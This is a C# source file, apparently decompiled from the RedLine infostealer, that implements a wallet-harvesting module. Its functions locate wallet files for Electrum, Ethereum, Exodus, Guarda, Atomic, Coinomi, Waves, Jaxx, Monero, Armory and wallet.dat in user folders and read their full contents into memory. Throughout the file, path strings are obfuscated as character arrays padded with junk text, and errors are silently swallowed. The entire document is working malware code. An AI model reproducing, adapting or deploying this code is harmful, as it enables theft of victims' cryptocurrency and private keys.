using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using RedLine.Reburn.Data.Extensions;
using RedLine.Reburn.Data.Helpers;
using RedLine.Reburn.Models.Info;

namespace RedLine.Reburn.Data.Applications;

public static class LocalWallets
{
	public static IList<ColdWallet> Get()
	{
		List<ColdWallet> list = new List<ColdWallet>();
		try
		{
			List<string> list2 = new List<string>();
			list2.AddRange(FileSystemHelper.FindPaths(Constants.RoamingAppData, 2, 1, new string(new char[19]
			{
				'w', 'a', 'a', 's', 'f', 'l', 'l', 'e', 'a', 's',
				'f', 't', '.', 'd', 'a', 't', 'a', 's', 'f'
			}).Replace("asf", string.Empty), new string(new char[12]
			{
				'w', 'a', 'a', 's', 'f', 'l', 'l', 'e', 't', 'a',
				's', 'f'
			}).Replace("asf", string.Empty)));
			list2.AddRange(FileSystemHelper.FindPaths(Constants.LocalAppData, 2, 1, new string(new char[19]
			{
				'w', 'a', 'a', 's', 'f', 'l', 'l', 'e', 'a', 's',
				'f', 't', '.', 'd', 'a', 't', 'a', 's', 'f'
			}).Replace("asf", string.Empty), new string(new char[12]
			{
				'w', 'a', 'a', 's', 'f', 'l', 'l', 'e', 't', 'a',
				's', 'f'
			}).Replace("asf", string.Empty)));
			try
			{
				list.AddRange(list2.Select((string x) => new FileInfo(x)).Select(delegate(FileInfo fileInfo)
				{
					byte[] fileBody = File.ReadAllBytes(fileInfo.FullName);
					return new ColdWallet(fileInfo.FullName)
					{
						FileBody = fileBody,
						FileWltName = fileInfo.Directory!.Name,
						FileWalletDir = fileInfo.Directory!.Name
					};
				}).IsNull());
			}
			catch
			{
			}
			list.AddRange(ParseElectrum());
			list.AddRange(ParseEth());
			list.AddRange(ParseExodus());
			list.AddRange(ParseGuarda());
			list.AddRange(ParseAtomic());
			list.AddRange(ParseCoinomi());
			list.AddRange(ParseWaves());
			list.AddRange(ParseJaxx());
			list.AddRange(ParseMonero());
			list.AddRange(ParseArmory());
			return list;
		}
		catch (Exception)
		{
			return list;
		}
	}

	private static List<ColdWallet> ParseArmory()
	{
		List<ColdWallet> list = new List<ColdWallet>();
		try
		{
			DirectoryInfo directoryInfo = new DirectoryInfo(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + new string(new char[7] { '\\', 'A', 'r', 'm', 'o', 'r', 'y' }));
			if (directoryInfo.Exists)
			{
				foreach (FileInfo item in directoryInfo.EnumerateFiles(new string(new char[8] { '*', '.', 'w', 'a', 'l', 'l', 'e', 't' }), SearchOption.TopDirectoryOnly))
				{
					if (item.Exists)
					{
						string fileWalletDir = item.Directory!.FullName.Replace(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\", string.Empty);
						byte[] array = File.ReadAllBytes(item.FullName);
						if (array != null)
						{
							list.Add(new ColdWallet
							{
								FileBody = array,
								FileInfoName = item.Name,
								FileWltName = new string(new char[6] { 'A', 'r', 'm', 'o', 'r', 'y' }),
								FileWalletDir = fileWalletDir
							});
						}
					}
				}
				return list;
			}
			return list;
		}
		catch
		{
			return list;
		}
	}

	private static List<ColdWallet> ParseGuarda()
	{
		List<ColdWallet> list = new List<ColdWallet>();
		try
		{
			DirectoryInfo directoryInfo = new DirectoryInfo(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + new string(new char[7] { '\\', 'G', 'u', 'a', 'r', 'd', 'a' }) + new string(new char[23]
			{
				'\\', 'L', 'o', 'c', 'a', 'l', ' ', 'S', 't', 'o',
				'r', 'a', 'g', 'e', '\\', 'l', 'e', 'v', 'e', 'l',
				'd', 'b', '"'
			}));
			if (directoryInfo.Exists)
			{
				foreach (FileInfo item in directoryInfo.EnumerateFiles(new string(new char[3] { '*', '.', '*' }), SearchOption.AllDirectories))
				{
					if (item.Exists)
					{
						string fileWalletDir = item.Directory!.FullName.Replace(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\", string.Empty);
						byte[] array = File.ReadAllBytes(item.FullName);
						if (array != null)
						{
							list.Add(new ColdWallet
							{
								FileBody = array,
								FileInfoName = item.Name,
								FileWltName = new string(new char[6] { 'G', 'u', 'a', 'r', 'd', 'a' }),
								FileWalletDir = fileWalletDir
							});
						}
					}
				}
				return list;
			}
			return list;
		}
		catch
		{
			return list;
		}
	}

	private static List<ColdWallet> ParseAtomic()
	{
		List<ColdWallet> list = new List<ColdWallet>();
		try
		{
			DirectoryInfo directoryInfo = new DirectoryInfo(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + new string(new char[7] { '\\', 'a', 't', 'o', 'm', 'i', 'c' }));
			if (directoryInfo.Exists)
			{
				foreach (FileInfo item in directoryInfo.EnumerateFiles(new string(new char[3] { '*', '.', '*' }), SearchOption.AllDirectories))
				{
					if (item.Exists)
					{
						string fileWalletDir = item.Directory!.FullName.Replace(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + new string(new char[7] { '\\', 'a', 't', 'o', 'm', 'i', 'c' }), new string(new char[6] { 'A', 't', 'o', 'm', 'i', 'c' }));
						byte[] array = File.ReadAllBytes(item.FullName);
						if (array != null)
						{
							list.Add(new ColdWallet
							{
								FileBody = array,
								FileInfoName = item.Name,
								FileWltName = new string(new char[6] { 'A', 't', 'o', 'm', 'i', 'c' }),
								FileWalletDir = fileWalletDir
							});
						}
					}
				}
				return list;
			}
			return list;
		}
		catch
		{
			return list;
		}
	}

	private static List<ColdWallet> ParseCoinomi()
	{
		List<ColdWallet> list = new List<ColdWallet>();
		try
		{
			string path = Path.Combine(Environment.ExpandEnvironmentVariables(new string(new char[9] { '%', 'a', 'p', 'p', 'd', 'a', 't', 'a', '%' })), new string(new char[8] { '\\', 'C', 'o', 'i', 'n', 'o', 'm', 'i' }));
			string path2 = Path.Combine(Environment.ExpandEnvironmentVariables(new string(new char[9] { '%', 'a', 'p', 'p', 'd', 'a', 't', 'a', '%' })), new string(new char[18]
			{
				'\\', 'C', 'o', 'i', 'n', 'o', 'm', 'i', '\\', 'w',
				'a', 'l', 'l', 'e', 't', '_', 'd', 'b'
			}));
			if (Directory.Exists(path))
			{
				foreach (FileInfo item in from x in Directory.EnumerateFiles(path, new string(new char[3] { '*', '.', '*' }), SearchOption.TopDirectoryOnly)
					select new FileInfo(x))
				{
					if (item.Exists)
					{
						byte[] array = File.ReadAllBytes(item.FullName);
						if (array != null)
						{
							list.Add(new ColdWallet
							{
								FileBody = array,
								FileInfoName = item.Name,
								FileWltName = new string(new char[7] { 'C', 'o', 'i', 'n', 'o', 'm', 'i' }),
								FileWalletDir = new string(new char[7] { 'C', 'o', 'i', 'n', 'o', 'm', 'i' })
							});
						}
					}
				}
			}
			foreach (FileInfo item2 in new DirectoryInfo(path2).EnumerateFiles(new string(new char[3] { '*', '.', '*' }), SearchOption.TopDirectoryOnly))
			{
				list.Add(new ColdWallet(item2.FullName)
				{
					FileWltName = "Coinomi",
					FileWalletDir = "Coinomi\\wallet_db"
				});
			}
			return list;
		}
		catch
		{
			return list;
		}
	}

	private static List<ColdWallet> ParseWaves()
	{
		List<ColdWallet> list = new List<ColdWallet>();
		try
		{
			foreach (FileInfo item in new DirectoryInfo(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + new string(new char[15]
			{
				'\\', 'w', 'a', 'v', 'e', 's', '-', 'e', 'x', 'c',
				'h', 'a', 'n', 'g', 'e'
			})).EnumerateFiles(new string(new char[3] { '*', '.', '*' }), SearchOption.AllDirectories))
			{
				string fileWalletDir = item.Directory!.FullName.Replace(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + new string(new char[15]
				{
					'\\', 'w', 'a', 'v', 'e', 's', '-', 'e', 'x', 'c',
					'h', 'a', 'n', 'g', 'e'
				}), new string(new char[5] { 'W', 'a', 'v', 'e', 's' }));
				list.Add(new ColdWallet(item.FullName)
				{
					FileWltName = new string(new char[5] { 'W', 'a', 'v', 'e', 's' }),
					FileWalletDir = fileWalletDir
				});
			}
			return list;
		}
		catch
		{
			return list;
		}
	}

	private static List<ColdWallet> ParseJaxx()
	{
		List<ColdWallet> list = new List<ColdWallet>();
		try
		{
			DirectoryInfo directoryInfo = new DirectoryInfo(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + new string(new char[17]
			{
				'\\', 'c', 'o', 'm', '.', 'l', 'i', 'b', 'e', 'r',
				't', 'y', '.', 'j', 'a', 'x', 'x'
			}));
			if (directoryInfo.Exists)
			{
				foreach (FileInfo item in directoryInfo.EnumerateFiles(new string(new char[3] { '*', '.', '*' }), SearchOption.AllDirectories))
				{
					if (item.Exists)
					{
						string fileWalletDir = item.Directory!.FullName.Replace(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + new string(new char[17]
						{
							'\\', 'c', 'o', 'm', '.', 'l', 'i', 'b', 'e', 'r',
							't', 'y', '.', 'j', 'a', 'x', 'x'
						}), new string(new char[4] { 'J', 'a', 'x', 'x' }));
						byte[] array = File.ReadAllBytes(item.FullName);
						if (array != null)
						{
							list.Add(new ColdWallet
							{
								FileBody = array,
								FileInfoName = item.Name,
								FileWltName = new string(new char[4] { 'J', 'a', 'x', 'x' }),
								FileWalletDir = fileWalletDir
							});
						}
					}
				}
				return list;
			}
			return list;
		}
		catch
		{
			return list;
		}
	}

	private static List<ColdWallet> ParseEth()
	{
		List<ColdWallet> list = new List<ColdWallet>();
		try
		{
			DirectoryInfo directoryInfo = new DirectoryInfo(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + new string(new char[17]
			{
				'\\', 'E', 't', 'h', 'e', 'r', 'e', 'u', 'm', '\\',
				'w', 'a', 'l', 'l', 'e', 't', 's'
			}));
			if (directoryInfo.Exists)
			{
				foreach (FileInfo item in directoryInfo.EnumerateFiles())
				{
					if (item.Exists)
					{
						byte[] array = File.ReadAllBytes(item.FullName);
						if (array != null)
						{
							list.Add(new ColdWallet
							{
								FileBody = array,
								FileInfoName = item.Name,
								FileWltName = new string(new char[8] { 'E', 't', 'h', 'e', 'r', 'e', 'u', 'm' }),
								FileWalletDir = new string(new char[16]
								{
									'E', 't', 'h', 'e', 'r', 'e', 'u', 'm', '\\', 'w',
									'a', 'l', 'l', 'e', 't', 's'
								})
							});
						}
					}
				}
				return list;
			}
			return list;
		}
		catch
		{
			return list;
		}
	}

	private static List<ColdWallet> ParseElectrum()
	{
		List<ColdWallet> list = new List<ColdWallet>();
		try
		{
			DirectoryInfo directoryInfo = new DirectoryInfo(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + new string(new char[17]
			{
				'\\', 'E', 'l', 'e', 'c', 't', 'r', 'u', 'm', '\\',
				'w', 'a', 'l', 'l', 'e', 't', 's'
			}));
			if (directoryInfo.Exists)
			{
				foreach (FileInfo item in directoryInfo.EnumerateFiles())
				{
					if (item.Exists)
					{
						byte[] array = File.ReadAllBytes(item.FullName);
						if (array != null)
						{
							list.Add(new ColdWallet
							{
								FileBody = array,
								FileInfoName = item.Name,
								FileWltName = new string(new char[8] { 'E', 'l', 'e', 'c', 't', 'r', 'u', 'm' }),
								FileWalletDir = new string(new char[16]
								{
									'E', 'l', 'e', 'c', 't', 'r', 'u', 'm', '\\', 'w',
									'a', 'l', 'l', 'e', 't', 's'
								})
							});
						}
					}
				}
				return list;
			}
			return list;
		}
		catch
		{
			return list;
		}
	}

	private static List<ColdWallet> ParseExodus()
	{
		List<ColdWallet> list = new List<ColdWallet>();
		try
		{
			DirectoryInfo directoryInfo = new DirectoryInfo(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + new string(new char[21]
			{
				'\\', 'E', 'x', 'o', 'd', 'u', 's', '\\', 'e', 'x',
				'o', 'd', 'u', 's', '.', 'w', 'a', 'l', 'l', 'e',
				't'
			}));
			if (directoryInfo.Exists)
			{
				foreach (FileInfo item in directoryInfo.EnumerateFiles())
				{
					byte[] array = File.ReadAllBytes(item.FullName);
					if (array != null)
					{
						list.Add(new ColdWallet
						{
							FileBody = array,
							FileInfoName = item.Name,
							FileWltName = new string(new char[6] { 'E', 'x', 'o', 'd', 'u', 's' }),
							FileWalletDir = new string(new char[20]
							{
								'E', 'x', 'o', 'd', 'u', 's', '\\', 'e', 'x', 'o',
								'd', 'u', 's', '.', 'w', 'a', 'l', 'l', 'e', 't'
							})
						});
					}
				}
				return list;
			}
			return list;
		}
		catch
		{
			return list;
		}
	}

	private static List<ColdWallet> ParseMonero()
	{
		List<ColdWallet> list = new List<ColdWallet>();
		try
		{
			DirectoryInfo directoryInfo = new DirectoryInfo(Environment.GetFolderPath(Environment.SpecialFolder.Personal) + new string(new char[15]
			{
				'\\', 'M', 'o', 'n', 'e', 'r', 'o', '\\', 'w', 'a',
				'l', 'l', 'e', 't', 's'
			}));
			if (directoryInfo.Exists)
			{
				foreach (FileInfo item in directoryInfo.EnumerateFiles())
				{
					byte[] array = File.ReadAllBytes(item.FullName);
					if (array != null)
					{
						list.Add(new ColdWallet
						{
							FileBody = array,
							FileInfoName = item.Name,
							FileWltName = new string(new char[6] { 'M', 'o', 'n', 'e', 'r', 'o' }),
							FileWalletDir = new string(new char[6] { 'M', 'o', 'n', 'e', 'r', 'o' })
						});
					}
				}
				return list;
			}
			return list;
		}
		catch
		{
			return list;
		}
	}
}
